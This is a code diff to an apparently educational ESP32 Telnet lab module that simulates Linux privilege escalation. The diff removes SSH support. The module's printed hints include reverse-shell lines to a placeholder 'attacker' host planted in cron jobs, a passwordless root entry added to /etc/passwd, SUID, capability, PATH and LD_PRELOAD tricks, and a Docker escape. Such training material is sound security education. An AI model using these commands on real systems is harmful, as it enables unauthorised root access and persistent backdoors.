@@ -1,51 +1,43 @@
 /*
  * Privilege Escalation Module
  * 
- * Implements privilege escalation vulnerabilities for SSH and Telnet services.
+ * Implements privilege escalation vulnerabilities for Telnet service.
  * Educational demonstrations of common Linux privilege escalation techniques.
- * 
- * SHARED between SSH (15_SSH.ino) and Telnet (08_Telnet.ino) for consistent
- * cross-service learning experience.
  */
 
-// Helper to send prompt based on connection type
+// Helper to send prompt
 void sendServicePrompt(WiFiClient &client, int clientIdx, bool isSSH) {
-  // SSH removed, only Telnet supported
+  // Only Telnet supported
   sendTelnetPrompt(client);
 }
 
 void handlePrivilegeEscalation(WiFiClient &client, String command, int clientIdx) {
-  // Use Telnet username (SSH removed)
+  // Use Telnet username
   String username = telnetUsernames[clientIdx];
-  bool isSSH = false;
   
   // SUDO without password check
   if (command.startsWith("sudo ")) {
     String sudoCmd = command.substring(5);
-    Serial.printf("[%s] ⚠️  PRIVESC: sudo without password check\n", isSSH ? "SSH" : "TELNET");
+    Serial.printf("[TELNET] ⚠️  PRIVESC: sudo without password check\n");
     Serial.printf("[HINT] sudo grants root access without authentication\n");
     client.printf("[sudo] Executing as root: %s\n", sudoCmd.c_str());
     client.println("✅ Command executed with ROOT privileges!");
     client.println("HINT: In secure systems, sudo requires password + sudoers validation");
-    sendServicePrompt(client, clientIdx, isSSH);
+    sendServicePrompt(client, clientIdx, false);
     return;
   }
   
   // SU - switch user without password
   if (command == "su" || command == "su -" || command == "su root") {
-    Serial.printf("[%s] ⚠️  PRIVESC: su without password\n", isSSH ? "SSH" : "TELNET");
+    Serial.printf("[TELNET] ⚠️  PRIVESC: su without password\n");
     
-    // Update username in appropriate array
-    if (isSSH) {
-      sshUsernames[clientIdx] = "root";
-    } else {
-      telnetUsernames[clientIdx] = "root";
-    }
+    // Update username in telnet array
+    telnetUsernames[clientIdx] = "root";
     
     client.println("Password: [bypassed in vulnerable mode]");
     client.println("✅ Switched to root user!");
     client.println("HINT: Check privileges with 'id' command");
-    sendServicePrompt(client, clientIdx, isSSH);
+    sendServicePrompt(client, clientIdx, false);
     return;
   }
   
@@ -61,7 +53,7 @@ void handlePrivilegeEscalation(WiFiClient &client, String command, int clientIdx
     client.println("/bin/systemctl  [EXPLOITABLE]");
     client.println("/usr/bin/python3.8  [cap_setuid+ep]");
     client.println("\nHINT: Try 'find . -exec /bin/bash \\; -quit' for privilege escalation");
-    sendServicePrompt(client, clientIdx, isSSH);
+    sendServicePrompt(client, clientIdx, false);
     return;
   }
   
@@ -77,7 +69,7 @@ void handlePrivilegeEscalation(WiFiClient &client, String command, int clientIdx
     client.println("\n✅ Escalated to ROOT via find -exec!");
     client.println("HINT: SUID binaries like find can spawn root shells");
     telnetUsernames[clientIdx] = "root";
-    sendServicePrompt(client, clientIdx, isSSH);
+    sendServicePrompt(client, clientIdx, false);
     return;
   }
   
@@ -88,7 +80,7 @@ void handlePrivilegeEscalation(WiFiClient &client, String command, int clientIdx
     client.println("✅ LD_PRELOAD set to: " + lib);
     client.println("Next SUID binary execution will load malicious library!");
     client.println("HINT: Create evil.so with getuid() returning 0, then 'sudo ls'");
-    sendServicePrompt(client, clientIdx, isSSH);
+    sendServicePrompt(client, clientIdx, false);
     return;
   }
   
@@ -99,7 +91,7 @@ void handlePrivilegeEscalation(WiFiClient &client, String command, int clientIdx
     client.println("Current/temp directory now in PATH!");
     client.println("HINT: Create malicious 'ls' or 'ps' in /tmp for privilege escalation");
     client.println("Example: echo '/bin/bash' > /tmp/ls && chmod +x /tmp/ls");
-    sendServicePrompt(client, clientIdx, isSSH);
+    sendServicePrompt(client, clientIdx, false);
     return;
   }
   
@@ -114,7 +106,7 @@ void handlePrivilegeEscalation(WiFiClient &client, String command, int clientIdx
     client.println("  :shell          - Get interactive shell");
     client.println("  :!/bin/sh       - Direct shell execution");
     client.println("\n[Simulated - press Enter to continue]");
-    sendServicePrompt(client, clientIdx, isSSH);
+    sendServicePrompt(client, clientIdx, false);
     return;
   }
   
@@ -127,7 +119,7 @@ void handlePrivilegeEscalation(WiFiClient &client, String command, int clientIdx
     client.println("/usr/bin/tar = cap_dac_read_search+ep  [FILE READ]");
     client.println("\nEXPLOIT EXAMPLE:");
     client.println("python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'");
-    sendServicePrompt(client, clientIdx, isSSH);
+    sendServicePrompt(client, clientIdx, false);
     return;
   }
   
@@ -140,7 +132,7 @@ void handlePrivilegeEscalation(WiFiClient &client, String command, int clientIdx
     client.println("0 2 * * * root /home/admin/cleanup.py  [WRITABLE BY admin]");
     client.println("\nHINT: If scripts are writable, inject reverse shell for persistence");
     client.println("echo 'bash -i >& /dev/tcp/attacker/4444 0>&1' >> /opt/backup.sh");
-    sendServicePrompt(client, clientIdx, isSSH);
+    sendServicePrompt(client, clientIdx, false);
     return;
   }
   
@@ -152,7 +144,7 @@ void handlePrivilegeEscalation(WiFiClient &client, String command, int clientIdx
     client.println("*/1 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'");
     client.println("\n✅ Crontab modified - backdoor established!");
     client.println("HINT: Cron jobs run with user privileges, some as root");
-    sendServicePrompt(client, clientIdx, isSSH);
+    sendServicePrompt(client, clientIdx, false);
     return;
   }
   
@@ -162,7 +154,7 @@ void handlePrivilegeEscalation(WiFiClient &client, String command, int clientIdx
     client.println("Linux esp32-device 3.13.0-32-generic #57-Ubuntu SMP [VULNERABLE]");
     client.println("\nHINT: Search exploit-db for 'Linux 3.13 privilege escalation'");
     client.println("Known exploits: DirtyCow (CVE-2016-5195), Overlayfs (CVE-2015-1328)");
-    sendServicePrompt(client, clientIdx, isSSH);
+    sendServicePrompt(client, clientIdx, false);
     return;
   }
   
@@ -174,7 +166,7 @@ void handlePrivilegeEscalation(WiFiClient &client, String command, int clientIdx
     client.println("PRIVESC: Add root user with no password:");
     client.println("echo 'hacker::0:0:root:/root:/bin/bash' >> /etc/passwd");
     client.println("su hacker  # No password required!");
-    sendServicePrompt(client, clientIdx, isSSH);
+    sendServicePrompt(client, clientIdx, false);
     return;
   }
   
@@ -187,7 +179,7 @@ void handlePrivilegeEscalation(WiFiClient &client, String command, int clientIdx
     client.println("  cat /.dockerenv");
     client.println("  ls -la /proc/1/cgroup");
     client.println("\nESCAPE: docker run -v /:/mnt --rm -it alpine chroot /mnt bash");
-    sendServicePrompt(client, clientIdx, isSSH);
+    sendServicePrompt(client, clientIdx, false);
     return;
   }
   
@@ -202,7 +194,7 @@ void handlePrivilegeEscalation(WiFiClient &client, String command, int clientIdx
     client.println("    (admin) ALL");
     client.println("\n⚠️  EXPLOITABLE sudo permissions found!");
     client.println("HINT: Use GTFOBins to find exploitation techniques");
-    sendServicePrompt(client, clientIdx, isSSH);
+    sendServicePrompt(client, clientIdx, false);
     return;
   }
 }
